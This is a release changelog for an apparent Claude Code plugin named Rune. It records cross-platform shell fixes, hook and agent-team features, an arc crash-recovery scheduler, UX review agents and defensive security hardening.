- **Consolidated date/path helpers into `lib/platform.sh`** — Added `_parse_iso_epoch()`, `_parse_iso_epoch_ms()`, `_now_epoch_ms()`, `_resolve_path()` to eliminate 6 copy-pasted date parsing blocks across scripts
- **Refactored 6 scripts** to use shared helpers: `rune-status.sh`, `lib/stop-hook-common.sh`, `detect-workflow-complete.sh`, `lib/run-artifacts.sh`, `learn/session-scanner.sh`, `arc-batch-preflight.sh`

### Added
- **Cross-platform shell compatibility rules** in `.claude/CLAUDE.md` — 14-pattern table (stat, date, readlink, sed, grep, timeout, flock, etc.) with 6 mandatory rules for all `.sh` scripts
- **87-case test suite** for `lib/platform.sh` — covers edge cases, injection attempts, temporal consistency, subshell/pipe safety, idempotent sourcing

## [1.144.3] - 2026-03-08

### Fixed
- **Cross-platform stat bug on Linux** — `stat -f %m` (macOS syntax) on Linux outputs filesystem text to stdout before failing, polluting variables with garbage data and causing `set -u` crashes when bash arithmetic evaluates `File` as an unbound variable name
- **Created `scripts/lib/platform.sh`** — Shared cross-platform helper that detects OS once via `uname -s` (cached in `_RUNE_PLATFORM`), exposes `_stat_mtime()` and `_stat_uid()` functions that call the correct stat variant directly (no fallback chain, no stdout pollution)
- **Refactored 17 scripts** to use `_stat_mtime`/`_stat_uid` instead of inline stat fallback chains or `if/else uname` blocks: `arc-batch-stop-hook.sh`, `arc-issues-stop-hook.sh`, `arc-phase-stop-hook.sh`, `arc-hierarchy-stop-hook.sh`, `on-session-stop.sh` (6 instances), `session-team-hygiene.sh`, `detect-workflow-complete.sh`, `pre-compact-checkpoint.sh` (2 instances), `rune-statusline.sh`, `rune-context-monitor.sh`, `rune-status.sh`, `guard-context-critical.sh` (2 instances), `advise-mcp-untrusted.sh`, `lib/stop-hook-common.sh` (3 instances), `lib/run-artifacts.sh`, `learn/echo-writer.sh`, `learn/session-scanner.sh`

## [1.144.2] - 2026-03-08

### Added
- **Self-Improvement Loop — Session Learning** — Real-time correction detection and session-start echo injection for continuous learning. Features:
  - **P1: Real-Time Correction Detection** — Two new hooks detect when Claude self-corrects during a session:
    - `correction-signal-writer.sh` (PostToolUse:Write|Edit) — Detects file-revert patterns (same file edited 2+ times)
    - `detect-corrections.sh` (Stop) — Scans JSONL for error→success patterns with confidence scoring
    - Session isolation via `config_dir` + `owner_pid` guards
    - Fast-path exit (<1ms) when watch marker absent
    - Debounce (max 1 suggestion per session)
    - Guard 4: Skips during active Rune workflows
  - **P2: Session-Start Echo Summary Injection** — Injects top 5 etched/inscribed echoes on session start:
    - Pure file reads (no MCP dependency)
    - Glob matching for layer priority
    - Symlink guard on MEMORY.md and echoes/
    - Total injection under 500 chars
    - Gated by `echoes.session_summary` talisman config
  - **P3: Elegance Check in Inner Flame** — Layer 3B self-review for non-trivial changes:
    - Complexity gate (3+ files OR 50+ lines per worker scope)
    - 3 elegance questions in self-review log
    - Gated by `inner_flame.elegance_check` talisman config

### Changed
- **learn skill** — Added `--watch`/`--unwatch` documentation for activating correction detection
- **session-start.sh** — Added echo injection function with layer priority
- **role-checklists.md** — Added elegance items for Worker/Fixer roles
- **CLAUDE.md** — Updated hook infrastructure table with LEARN-001/LEARN-002 entries

## [1.144.1] - 2026-03-08

### Fixed
- **DECREE-001 documentation** — Converted unimplemented assertion pseudocode to reference pattern in collapsible details block. Clarified that the WARNING block documents the risk; implementers are trusted to follow `PHASE_ORDER`.
- **DECREE-003 documentation** — Removed incorrect claim about `audit-agent-registry.sh` validation. The script validates agent registry, not PHASE_PREFIX_MAP sync. Sync is now documented as a manual check with warning on mismatch.
- **CFG-DECREE-002 naming** — Removed confusing hybrid prefix, replaced with plain comment about timeout clamping.
- **arc-failure-policy.md cross-reference** — Replaced inline DECREE-002 reference with proper markdown link to convergence-gate.md.

### Changed
- **DECREE-004: reader+writer race condition semantics** — Documented accepted race condition behavior for simultaneous reader+writer execution (advisory) in workflow-lock.sh. Users seeking atomic consistency should run workflows sequentially or use git commits as synchronization points.

## [1.144.0] - 2026-03-08

### Added
- **Arc Scheduler — Scheduled Task Monitoring** — Automatic crash recovery for arc pipelines. When an arc's stop hook fails (timeout, error, crash), a scheduled monitoring task detects the unexpected stop and automatically resumes via `/rune:arc --resume`. Features:
  - Configurable check interval (default: 15 minutes)
  - Resume limits (max 10 total, max 3 consecutive failures)
  - Cooldown period (5 min) to prevent concurrent resumes
  - User cancellation detection (user_cancelled flag prevents auto-resume)
  - 3-day task renewal for long-running arcs
  - Session isolation (config_dir + owner_pid verification)
  - Graceful degradation when scheduler unavailable (Claude Code < v2.1.71 or `CLAUDE_CODE_DISABLE_CRON=1`)
- **Checkpoint schema v22** — New fields: `user_cancelled`, `cancel_reason`, `cancelled_at`, `stop_reason`, `cron_task_id`, `resume_tracking`, `scheduler`
- **Arc state file schema update** — Added `user_cancelled`, `cancel_reason`, `cancelled_at`, `stop_reason` fields to `.claude/arc-phase-loop.local.md`
- **Talisman configuration** — New `arc.scheduler` section with enabled, interval_minutes, auto_renew, auto_resume settings

### Changed
- **cancel-arc command** — Now sets user_cancelled flags instead of deleting state file, allowing monitoring task to detect cancellation
- **post-arc cleanup** — CronDelete runs FIRST before echo persist to close race window

### Prerequisites
- Claude Code >= v2.1.71 (CronCreate/CronDelete/CronList tools)
- `CLAUDE_CODE_DISABLE_CRON` must not be set

## [1.143.8] - 2026-03-08

### Fixed
- **Convergence gate circuit breaker** — Added hard limit check for `maxRounds` in `evaluateConvergence()` that halts review regardless of metric state when tier limit is reached. Ensures bounded review rounds per tier (CHUNK_STANDARD=2, CHUNK_DEEP=3).
### Fixed
- **arc-batch plan path loss (FIX-001)** — Claude drops the second argument from `Skill("rune:arc", "plan-path ...")`, causing every arc iteration to be a no-op. Two-pronged fix: stop hook writes plan path to `tmp/.rune-arc-batch-next-plan.txt` as fallback, arc preflight reads it when `$ARGUMENTS` is empty. Prompt reinforced with explicit two-argument warning. Applied to both stop hook and `batch-loop-init.md` Phase 5.
## [1.143.6] - 2026-03-08

### Fixed
- **arc phase desync: `ux_verification` missing from stop hook** — PR #222 (UX Design Intelligence) added `ux_verification` to `arc-phase-constants.md`, `arc-checkpoint-init.md`, `arc-phase-cleanup.md`, and `arc-preflight.md` but never updated `arc-phase-stop-hook.sh`. Stop hook had 27 phases vs the canonical 28, silently skipping `ux_verification`. Added to PHASE_ORDER, `_phase_ref()`, verified alignment across all 5 sources.
- **arc phase desync: `storybook_verification` missing from checkpoint init** — PR #188 (Storybook Arc Integration) added `storybook_verification` to PHASE_ORDER, stop hook, and reference files but never added it to `arc-checkpoint-init.md`. Checkpoint schema created without `storybook_verification` entry. Also missing from `arc-phase-cleanup.md` PHASE_PREFIX_MAP and `arc-preflight.md` ARC_TEAM_PREFIXES. Added to all 3.
- **arc dispatch herald phantom checkpoint fields** — PR #234 (Utility Crew) referenced 5 non-existent checkpoint fields: `checkpoint.team_name` (root-level, only exists per-phase), `checkpoint.crew_used` (never initialized), `checkpoint.context_packs_dir`, `checkpoint.output_dir`, `checkpoint.plan_path` (should be `plan_file`). Fixed all references to use correct schema paths.
- **arc dispatch herald duplicate code block** — Two nearly-identical herald blocks existed in SKILL.md (lines 233-273 and 361-409). First block was dead code (gated by `checkpoint.crew_used` which is never set). Removed dead block, kept and fixed the second block.
- **arc dispatch herald default-enabled** — `utility_crew` defaulted to `{ enabled: true }` when absent from talisman, causing unexpected herald spawn attempts for all users. Changed to `{ enabled: false }` (opt-in).

## [1.143.5] - 2026-03-08

### Fixed
- **arc-batch skill-load-without-execute (FIX-005)** — When the Stop hook injects an arc prompt telling Claude to call `Skill("rune:arc", ...)`, Claude loads the skill but ends its response without executing the loaded instructions. No checkpoint is created, no phase loop starts, and each batch iteration completes in ~1-2 minutes doing nothing. Root cause: Claude treats "Successfully loaded skill" as task completion rather than the beginning of execution. Fix: restructured all 3 Stop hook prompts (batch, issues, hierarchy) and `batch-loop-init.md` Phase 5 to separate "LOAD" (step 5) from "EXECUTE" (step 6) with explicit mandatory continuation instructions. Step 6 spells out the concrete entry points (arc-preflight.md → arc-checkpoint-init.md → phase loop state file → first phase) so Claude has an actionable path after skill loading.

## [1.143.4] - 2026-03-08

### Fixed
- **arc-batch plan path loss (FIX-001)** — Claude drops the second argument from `Skill("rune:arc", "plan-path ...")`, causing every arc iteration to be a no-op. Two-pronged fix: stop hook writes plan path to `tmp/.rune-arc-batch-next-plan.txt` as fallback, arc preflight reads it when `$ARGUMENTS` is empty. Prompt reinforced with explicit two-argument warning. Applied to both stop hook and `batch-loop-init.md` Phase 5.
- **ZSH `\!=` in team cleanup prompt (FIX-002)** — Stop hook injects team cleanup script where `[[ "$owner" != "$MY_SESSION" ]]` gets escaped to `\!=` by Claude, causing `condition expected: \!=` in ZSH. Replaced with ZSH-safe positive matching: `[[ -z "$owner" ]] || [[ "$owner" = "$MY_SESSION" ]] || continue`. Applied to all 3 stop hooks (batch, hierarchy, issues).
- **GUARD 10 `_iso_to_epoch` silent failure (FIX-004)** — `$(_iso_to_epoch ... || echo "")` could fail under `set -euo pipefail`, causing rapid iteration detection to silently skip. Changed to if-context pattern (`if _val=$(...); then`) which is exempt from `set -e`. Applied to all 3 stop hooks (batch, hierarchy, issues).

## [1.143.3] - 2026-03-07

### Fixed
- **ARC-BATCH-001 regression: first plan never invokes arc pipeline** — `batch-loop-init.md` Phase 5 used `Skill("arc", ...)` without the `rune:` prefix, causing Claude to either fail skill resolution or skip the pipeline and implement the plan directly. Changed to `Skill("rune:arc", ...)` with CRITICAL anti-skip instructions, matching the stop hook's convention (fixed in v1.109.4 but not applied to Phase 5). Also fixed the same bug in `arc-hierarchy/references/main-loop.md` and `arc-issues/references/arc-issues-algorithm.md`.
- **codex-exec.sh bare path resolution** — 5 codex invocation sites used bare `codex-exec.sh` or `./scripts/codex-exec.sh` without `${CLAUDE_PLUGIN_ROOT}` prefix, causing `command not found` (exit 127) when teammates run from CWD. Fixed in: `arc-phase-task-decomposition.md`, `arc-phase-pre-ship-validator.md`, `arc-phase-test.md`, `codex-wing-prompts.md` (2 sites).

## [1.143.2] - 2026-03-07

### Fixed
- **arc-batch GUARD 10 threshold** — Raised `MIN_RAPID_SECS` from 90s to 180s to prevent phantom arcs (skill loading ~90-120s) from slipping past the rapid iteration detector
- **arc-batch GUARD 10b** — Added secondary context-critical check for short iterations (<300s) that produce no arc output, catching phantom arcs that pass the elapsed-time threshold but never entered the phase loop
- **arc-batch progress init** — Added explicit `started_at: null` to per-plan entries in `phase-3-progress-init.md` to prevent plan 1 from inheriting the batch-level timestamp

## [1.143.1] - 2026-03-07

### Fixed
- **README sync** — Updated all component counts and tables to match actual plugin state
  - Version badge: 1.141.0 → 1.143.1
  - Agent count: 96 → 100 (added 6 UX/design review, 2 storybook work, 4 utility crew agents)
  - Skills count: 43 → 53 (added 11 missing skills to table)
  - Arc phases: 26 → 28 (added Storybook Verification, UX Verification)
  - Commands: added 8 missing commands to Utilities table + brainstorm alias
  - Architecture section: corrected all file counts (agents 100, review 34, utility 26, testing 5, skills 53, commands 18, scripts 156)

## [1.143.0] - 2026-03-07

### Added
- **Utility Crew — Context Pack Protocol** — 3 new utility agents for file-based prompt composition and validation
  - `context-scribe` — Composes per-teammate `.context.md` files from templates + runtime data (9-section format)
  - `prompt-warden` — Validates context packs via 12-point checklist, writes verdict.json (PROCEED/WARN/BLOCK)
  - `dispatch-herald` — Detects context pack staleness between arc phases (file drift, TOME drift, plan modification, convergence iteration)
- **utility-crew skill** — Non-invocable skill with `spawnUtilityCrew()` and `refreshStalePacks()` protocols, talisman-gated
- **Context pack references** — `context-pack-schema.md`, `review-checklist.md`, `scribe-template-map.md`
- **Talisman utility_crew config** — `settings.utility_crew` namespace with per-agent configuration (timeouts, thresholds, gates)
- **Workflow integrations** — Crew phase inserted into appraise/audit (Phase 2.5-2.8), strive (Phase 1.5), devise (Phase -0.5), arc (inter-phase herald)

### Changed
- **Tarnished context reduction** — Prompt composition delegated to context-scribe, reducing lead context from O(N) to O(1) for N teammates
- **Agent count**: 97 → 100 (3 new utility agents: context-scribe, prompt-warden, dispatch-herald)
- **Skill count**: 52 → 53 (new utility-crew skill)

## [1.142.0] - 2026-03-07

### Added
- **codex-phase-handler** — New utility agent for delegated Codex phase execution

### Changed
- **Arc Codex delegation** — Delegated 5 Codex phases (2.8, 4.5, 5.6, 7.8, 8.55) to codex-phase-handler teammate
- **Tarnished context optimization** — Zero Codex output tokens in Tarnished context window (~60k token savings per pipeline)

## [1.141.2] - 2026-03-07

### Fixed
- **Figma MCP server** — Fix `FigmaClient not available in server context` error caused by MCP Python SDK v1.26.0 breaking change. Updated lifespan context access path: `ctx.request_context["figma_client"]` → `ctx.request_context.lifespan_context["figma_client"]`
- **MCP SDK version pin** — Pin `mcp[cli]>=1.6.0,<2.0.0` to prevent future breakage from SDK API changes

## [1.141.1] - 2026-03-07

### Fixed
- **Hook scope isolation** — `enforce-teams.sh` (ATE-1) and `guard-context-critical.sh` (CTX-GUARD-001) now scope enforcement to Rune agents only. Non-Rune agents from other plugins pass through unblocked during active Rune workflows
- **Shared agent registry** — Extract `KNOWN_RUNE_AGENTS` into `scripts/lib/known-rune-agents.sh` (single source of truth, sourced by both hooks). Adds `is_known_rune_agent()` helper with compound suffix support (`-inspect`, `-plan-review`, `-deep`)
- **Agent registry sync** — Add 3 missing agents (`codex-oracle`, `shard-reviewer`, `verdict-binder`) to registry. Total: 121 base names + suffix matching
- **XXE fallback warning** — `figma_desktop_bridge.py` now logs a warning when `defusedxml` is not installed, making the silent fallback to stdlib ET visible to operators
- **Bridge file path consistency** — Updated `rune-statusline.sh` and `guard-context-critical.sh` to use `${TMPDIR:-/tmp}` for bridge file paths, matching the cleanup path in `on-session-stop.sh`. Prevents orphaned bridge files on macOS where `$TMPDIR` differs from `/tmp`
- **Audit finding resolutions** — 1 P1 XXE fix (defusedxml with warning), 4 P2 security hardening (field regex validation, printf over echo, nullglob scoping, TMPDIR consistency), 2 P3 improvements (Optional import, TMPDIR bridge path)

### Added
- **`scripts/audit-agent-registry.sh`** — Validates registry stays in sync with `agents/**/*.md`, `specialist-prompts/*.md`, and `ash-prompts/*.md`. Understands suffix-matched compound names
- **New test cases** — 7 new tests for enforce-teams.sh (non-Rune exemption, Rune still blocked, unnamed blocked, suffix variants), 4 new tests for guard-context-critical.sh (non-Rune TeamCreate/Agent allowed at critical)

## [1.141.0] - 2026-03-07

### Added
- **Arc Utility Crew** — 5 new utility agents + 2 shell scripts for arc team lead context optimization
  - `tome-digest` agent — Extracts P1/P2/P3 counts, recurring patterns, affected files from TOME
  - `condenser-gap` agent — Extracts MISSING/PARTIAL/COMPLETE counts from gap-analysis.md
  - `condenser-verdict` agent — Extracts dimension scores, flags low-scoring (<7) dimensions
  - `condenser-plan` agent — Extracts sections, acceptance criteria, file targets from enriched-plan.md
  - `condenser-work` agent — Extracts committed files, task counts from work-summary.md
  - `utility-crew-extract.sh` — Unified shell-based extraction script (5 modes, zero LLM tokens)
  - `write-phase-summary.sh` — Deterministic phase group summary generator (reads digests + checkpoint)
- **Talisman utility_crew config** — Master toggle + per-agent/mode toggles for all utility crew features
- **Agent count**: 91 → 96 (5 new utility agents)

### Changed
- **Brainstorm SSRF defense** — Phase 3.5 Design Asset Detection filters Figma URLs through SSRF blocklist (localhost, private ranges, link-local, IPv6 loopback, reserved TLDs) before fetch
- **Arc Phase 7 (Mend)** — Lead uses shell-extracted tome-digest JSON (~500 tokens) instead of reading full TOME (10-50K tokens) with graceful fallback
- **Arc Phase 6 (Code Review)** — Lead uses shell-extracted gap/verdict digests instead of reading full artifacts (7-15K tokens saved)
- **Arc Phase 5.5 (Gap Analysis)** — Pre-extracts plan and work-summary digests for orchestrator quick-checks
- **Arc Phase 7.5 (Verify Mend)** — Round-aware tome-digest extraction for convergence checks

### Fixed
- **Decree-arbiter P1 resolution** — All digest extraction uses shell scripts instead of Explore subagents (which cannot Write files). Zero LLM token cost, sub-second execution

## [1.140.3] - 2026-03-06

### Changed
- **Progressive disclosure refactoring** — Extract 9 oversized SKILL.md files (>500 lines) into `references/*.md` files per skill-creator best practices
  - 21 new reference files across devise, codex-review, goldmask, resolve-todos, talisman, brainstorm, strive, design-sync, design-system-discovery
  - Net -2,945 lines from SKILL.md bodies; all 9 skills now under 500 lines (range: 221-438)
  - Common extraction targets: team bootstrap protocols, cleanup phases, codex integration blocks, large inline agent spawn prompts

### Added
- **trace-logger.sh** — Shared `_trace()` function for hook scripts with auto-detected caller via `BASH_SOURCE[1]`, symlink-safe, zero overhead when `RUNE_TRACE` disabled

### Fixed
- **DOC-001**: Removed duplicated Phases 4-5 pseudocode from design-system-discovery SKILL.md (content already in signal-aggregation.md)
- **PAT-003**: Split dual-link See line in brainstorm SKILL.md into two separate sentences for pattern consistency

## [1.140.2] - 2026-03-06

### Fixed
- **SEC-001**: Venv packages installed but server runs with system python3 — both `echo-search/start.sh` and `figma-to-react/start.sh` now use `$PYTHON` variable resolving to venv python for import check and exec
- **SEC-002**: Bare `except Exception` on reindex narrowed to `(sqlite3.Error, OSError, IOError)` with differentiated empty/stale log message in `server.py`
- **SEC-003**: Token-less FigmaClient produces confusing error — added diagnostic warning when `_resolve_token()` returns None in `cli.py`
- **QUAL-003**: README updated to reflect venv-based auto-install (removed `--break-system-packages` instructions)

## [1.140.1] - 2026-03-06

### Fixed
- **SEC-002**: TOCTOU race between symlink check and `rm -rf` → atomic `find ... -not -type l -exec rm` in `on-session-stop.sh`, `detect-workflow-complete.sh`
- **SEC-003**: `eval` usage for shell option restoration → conditional `shopt -q`/`shopt -u` pattern in `enforce-team-lifecycle.sh`, `session-team-hygiene.sh`, `arc-phase-stop-hook.sh`
- **SEC-006**: `enforce-polling.sh` PID fallback always returns dead → actual `kill -0` liveness check
- **BUG-001**: Dead PID leaves stale state file blocking enforcement → self-healing cleanup in `pretooluse-write-guard.sh`
- **BUG-002**: EXIT trap overwrite leaks `$DEDUP_FILE` → unified `_cleanup_shard` in `arc-batch-preflight.sh`
- **BUG-003**: Unpopulated `SEEN` array → read from dedup file in `arc-batch-preflight.sh`
- **BUG-004**: `echo-writer.sh` EXIT trap overwrites ERR → combined trap with `exit 0`
- **BUG-006**: `rune-status.sh` missing `storybook_verification` in PHASE_ORDER
- **PAT-006**: stdin cap inconsistency (64KB vs 1MB) → standardized `head -c 1048576 2>/dev/null || true` across 5 scripts
- **PAT-008**: 4 learn/ scripts missing `RUNE_TRACE_LOG` and `_trace()` declarations

## [1.140.0] - 2026-03-06

### Added
- **UX Design Intelligence** — Full UX review pipeline with greenfield/brownfield methodology
  - **ux-design-process** skill — UX-aware planning with greenfield (8-step) and brownfield (6-step) methodologies, 8 reference files (aesthetic-direction, web-interface-rules, interaction-patterns, heuristic-checklist, ux-pattern-library, ux-scoring, greenfield-process, brownfield-process)
  - **ux-heuristic-reviewer** agent (UXH-) — Nielsen Norman 10 heuristics at code level, 50+ checklist items. Conditional: `ux.enabled` + frontend files
  - **ux-flow-validator** agent (UXF-) — User flow completeness: loading states, error boundaries, empty states, confirmation dialogs, undo, graceful degradation. Conditional: `ux.enabled` + frontend files
  - **ux-interaction-auditor** agent (UXI-) — Micro-interaction audit: hover/focus states, keyboard accessibility, touch targets (44px min), animation performance, prefers-reduced-motion. Conditional: `ux.enabled` + frontend files
  - **ux-cognitive-walker** agent (UXC-) — Cognitive walkthrough: first-time user simulation, discoverability, learnability, error recovery. Conditional: `ux.enabled` + `cognitive_walkthrough: true`
  - **ux-pattern-analyzer** utility agent — Codebase UX maturity assessment for devise Phase 0.3
  - **Arc Phase 5.3 UX Verification** — Conditional arc phase with up to 4 UX review agents, 5-min timeout, full 3-layer crash recovery (ARC_TEAM_PREFIXES + PHASE_PREFIX_MAP + phase reference)
  - **Checkpoint schema v21** — Added `ux_verification` phase slot with v20→v21 migration
  - **Talisman `ux:` namespace** — enabled, blocking, cognitive_walkthrough, agents, thresholds config
  - **Dedup hierarchy** — UXH/UXF/UXI/UXC positioned below FRONT, above CDX
  - **aesthetic-quality-reviewer** extended with Vercel-inspired web interface quality rules (semantic HTML, responsive breakpoints, animation performance, reduced motion compliance)
  - **aesthetic-thinking.md** — Design token enforcement + 4 anti-slop detection rules for frontend-design-patterns
  - **react-performance-rules.md** — 18 React performance rules (PERF-R01 through PERF-R18)
  - **react-composition-rules.md** — React composition patterns + 5 anti-patterns (COMP-A01 through COMP-A05)
  - **ui-ux-planning-protocol.md** — Added Step 0 UX Process Selection for greenfield/brownfield routing
  - **devise cleanup** — Added ux-pattern-analyzer to fallback array

## [1.139.2] - 2026-03-06

### Fixed
- **Session parsing**: Switch `.session` file reading from `head -c` to `jq -r '.session_id'` in enforce-teams.sh, arc-batch/hierarchy/issues stop hooks for consistent JSON-based session ownership
- **CWD resolution**: Fix `detect-workflow-complete.sh` to read CWD from stdin JSON input (consistent with other Stop hooks) instead of `CLAUDE_PROJECT_DIR`
- **agent_id support**: Extract `agent_id` from Claude Code 2.1.69+ input in enforce-teams.sh, on-task-completed.sh, on-teammate-idle.sh
- **session-team-hygiene**: Session-aware orphan checkpoint counting
- **e2e-browser-tester**: Add `AskUserQuestion` to allowed tools
- **enforce-teams**: Document stale threshold cross-reference table (TLC-001/TLC-003/ATE-1/CDX-7)

## [1.139.1] - 2026-03-06

### Fixed
- **GAP-F-001**: Zero-region PASS bug — verification gate now ABORTs when VSM extraction produces 0 regions instead of emitting misleading PASS verdict (SKILL.md + arc-phase-design-extraction.md)
- **GAP-S-001/S-002**: VSM field injection — added `sanitizeForPrompt()` to strip prompt injection patterns from Figma-derived component names before worker task description injection
- **GAP-S-003**: Threshold validation — gate now clamps warn/block to 0-100, detects inverted thresholds, and reverts to defaults with config warning
- **GAP-S-004**: Added `high_confidence_threshold: 0.80` to `build-talisman-defaults.py` trust_hierarchy defaults
- **GAP-I-001**: Resolved `backend_impact.enabled` default inconsistency — aligned to `false` in both SKILL.md config block and build-talisman-defaults.py (talisman-sections.md was already `false`)
- **GAP-F-002/F-003**: BLOCK verdict now propagated to Phase 2 workers via `gateContext` string in task descriptions and `checkpoint.vsm_quality` in arc context
- **GAP-F-004**: Multi-URL enriched-vsm.json key collision — keys now URL-namespaced (`url-1/Button.md`) when multiple Figma URLs are used
- **SEC-04**: Gate `enabled` flag now type-checked — string `"false"` emits warning instead of silently disabling gate
- **GAP-O-002**: Echo integration — BLOCK verdicts now persist to `.claude/echoes/workers/MEMORY.md` for pattern detection
- **GAP-O-003**: Confidence distribution summary logged after gate execution (HIGH/MEDIUM/LOW counts)
- **GAP-I-003**: Clarified worker-trust-hierarchy.md flowchart Step 5 applies to Phase 2 implementation workers only
- **GAP-M-002**: Linked orphaned `state-detection-algorithm.md` in SKILL.md References section
- **DSAP-D-003**: Clarified `countCoveredRegions` dual calling convention (array form vs enriched form) in verification-gate.md
- Build-time threshold cross-validation in `build-talisman-defaults.py` (warns on inverted thresholds)
- Negative mismatch clamping (`Math.max(0, ...)`) with diagnostic warning on over-coverage

### Added
- **GAP-T-001-004**: Executable test harness in verification-gate.md with `computeVerdict()` and `classifyConfidence()` pure functions, 15 gate fixture cases (including custom thresholds, inverted thresholds, non-integer mismatch, over-coverage), 8 confidence boundary tests (exact 0.60/0.80 boundaries), and 3 negative regression test assertions
- **GAP-M-001**: Migration guide (`references/migration-guide.md`) — enabling accuracy features, rollback paths for BLOCK storms, threshold tuning, troubleshooting

## [1.139.0] - 2026-03-06

### Added
- **`/rune:team-spawn`** — Spawn Agent Teams using presets (review, work, plan, fix, debug, audit) or custom composition. Wraps team-sdk `TeamEngine.ensureTeam()` and `spawnWave()` for ad-hoc team creation outside workflow skills.
- **`/rune:team-shutdown`** — Gracefully shut down standalone agent teams and clean up resources. Wraps team-sdk `TeamEngine.shutdown()` and `cleanup()`. Supports `--force` flag for immediate termination.
- **`/rune:team-delegate`** — Task delegation dashboard for managing team workload, assignments, and messaging. Works with both standalone and workflow-spawned teams. Supports `--assign`, `--message`, and `--create` subcommands.
- **rest.md cleanup** — Added `team` to state file cleanup scan for `/rune:rest` and `--heal` mode.

## [1.138.1] - 2026-03-06

### Fixed
- **ERR-001**: Added null handle guards to `shutdown()`, `cleanup()`, and `getStatus()` in team-sdk engines — prevents crash when handle is null after compaction or fallback failure
- **ERR-003**: `cleanup()` now logs warnings on state file operation failures instead of silently swallowing errors

## [1.138.0] - 2026-03-06

### Fixed
- **SEC-INJECT-001**: Added `html.escape()` to echo-search `reranker.py` query string before prompt interpolation — prevents prompt injection via crafted search queries
- **SEC-FAIL-CLOSED-001**: Changed `enforce-teams.sh` jq-missing exit from 0 (fail-open) to 2 (fail-closed) — security hook must block when dependencies are unavailable
- **SHELL-001**: Migrated all `echo "$INPUT" | jq` to `printf '%s\n' "$INPUT" | jq` across 17 hook scripts — prevents unintended escape interpretation in shell pipelines
- **SHELL-002**: Added `2>/dev/null || true` guards to 5 unprotected `head -c` calls — prevents pipeline errors from propagating to hook exit codes
- **SHELL-003**: Added source file existence guard in `guard-context-critical.sh` for `resolve-session-identity.sh` — graceful fallback when dependency is missing
- **REF-001**: Updated 4 stale `team-lifecycle-guard.md` references in cancel commands and `rest.md` to point to `team-sdk/references/engines.md`
- **REF-002**: Updated `security-patterns.md` consumer list from `team-lifecycle-guard.md` to `team-sdk/references/engines.md`

## [1.137.0] - 2026-03-05

### Changed
- **team-sdk adoption** — All 14 workflow skills (devise, strive, brainstorm, forge, inspect, goldmask, mend, appraise, audit, codex-review, resolve-todos, debug, design-sync, arc) now include `team-sdk` in their Load skills list. Team lifecycle references point to centralized SDK instead of duplicated guard files.
- **team-lifecycle-guard.md consolidated** — Both copies (rune-orchestration 569 lines, roundtable-circle 368 lines) replaced with 11-line redirect stubs pointing to team-sdk/references/engines.md and protocols.md.
- **49 cross-references updated** — All team-lifecycle-guard.md links across SKILL.md files, arc references, roundtable-circle references, and project CLAUDE.md now point to team-sdk canonical references.
- **team-sdk self-references fixed** — 4 circular links within team-sdk (SKILL.md, engines.md, protocols.md) converted to self-relative sibling links.
- **roundtable-circle Load skills** — Added `team-sdk` to roundtable-circle, cascading to appraise, audit, and codex-review.

## [1.136.0] - 2026-03-05

### Added
- **Team Management SDK** — Centralized `team-sdk` skill providing ExecutionEngine interface (9 methods: createTeam, spawnAgent, spawnWave, shutdownWave, monitor, sendMessage, shutdown, cleanup, getStatus), TeamEngine implementation with full teamTransition protocol, shared protocols (session isolation, workflow lock, signals, handle serialization), 6 built-in presets (review, work, plan, fix, debug, audit), and extracted monitoring utilities. Reduces ~900 lines of duplicated code across 11 skills.
- **`/rune:team-status`** — Team monitoring dashboard command for inspecting active teams, teammates, and task progress. First user-facing command built on the Team Management SDK.
- **MCP auto-install** — Python MCP dependencies (`mcp[cli]`) are now auto-installed on first use for echo-search and figma-to-react servers. Eliminates manual setup steps for users. Added `--break-system-packages` flag for macOS SIP compatibility.

### Fixed
- **CDX-RELEASE-001** — Closed unclosed quote in echo-search `start.sh` that prevented MCP server from launching.
- **DOC-001** — Fixed method count "8 methods" → "9 methods" in team-sdk SKILL.md.
- **DOC-002** — Aligned stuck worker default to `teammate_lifecycle` section with 20min default (matching strive implementation).
- **DOC-003** — Documented co-firing race condition when `staleWarnMs` equals `autoReleaseMs` in forge preset monitoring config.

## [1.135.1] - 2026-03-05

### Fixed
- **FLAW-003**: Guard `dir_mtime=0` from causing fresh team directories to be incorrectly classified as stale and cleaned up in `on-session-stop.sh`
- **FLAW-007**: Changed `enforce-teams.sh` from fail-open to fail-closed when `resolve-session-identity.sh` is missing — prevents cross-session interference
- **SEC-002**: Added allowlist character validation for Codex prompt file paths in `codex-exec.sh`
- **SEC-003**: Added ECHO_DIR allowlist validation (home/project/tmp) in echo-search `server.py`, matching existing DB_PATH pattern
- **SEC-004**: Two-pass prompt sanitization in echo-search `decomposer.py` — strips control/zero-width chars before HTML escape

## [1.135.0] - 2026-03-05

### Added
- **Teammate stop mechanism (Claude Code 2.1.69+)** — `on-teammate-idle.sh` now stops stuck teammates via `{"continue": false, "stopReason": "..."}` after 3 consecutive quality gate failures, replacing infinite exit-2 blocking. File-based retry counter in `tmp/.rune-signals/{team}/{teammate}.idle-retries`. Security exits (path traversal) bypass retry — always hard exit 2.
- **`agent_type` hook tracing (Claude Code 2.1.69+)** — `on-teammate-idle.sh`, `on-task-completed.sh`, and `enforce-teams.sh` now parse and log the new `agent_type` field from hook events. Included in ATE-1 deny JSON `additionalContext` for diagnostics.
- **`includeGitInstructions` arc preflight check** — Warns when `includeGitInstructions: false` or `CLAUDE_CODE_DISABLE_GIT_INSTRUCTIONS` env var is set. Arc ship/merge phases (23-27) depend on built-in git workflow instructions.

### Fixed
- **SEC-003 stderr swallowed by group redirect** — Replaced `{ echo ... >&2; } 2>/dev/null; exit 2` pattern with `printf ... >&2 2>/dev/null || true; exit 2` in `on-teammate-idle.sh`. The old pattern redirected fd 2 to /dev/null for the entire group, silently discarding stderr messages. Fixes 7 pre-existing test failures (5 in `test_on_teammate_idle.py`, 2 in `test_hooks.py`).

## [1.134.2] - 2026-03-05

### Fixed
- **yq `//` operator treating `false` as falsy** — Replaced `yq -r '.key // true'` with explicit `if .key == false then "false" else "true" end` in `validate-inner-flame.sh` and `rune-context-monitor.sh`. Users can now properly disable Inner Flame and Context Monitor via `talisman.yml`.
- **`local` keyword outside function context** — Removed invalid `local` from top-level script body in `enforce-team-lifecycle.sh` (bash 3.2 compatibility). Moved `local stored_pid` to function top in `workflow-lock.sh`.
- **Legacy comment-style type hints** — Modernized `indexer.py` to Python 3.10+ annotations with `from __future__ import annotations`. Added type annotations to `build-talisman-defaults.py` helpers.
- **Stale `Task` in allowed-tools** — Updated `plan-review.md`, `review.md`, `work.md` from `Task` to `Agent` per Claude Code 2.1.63 rename.
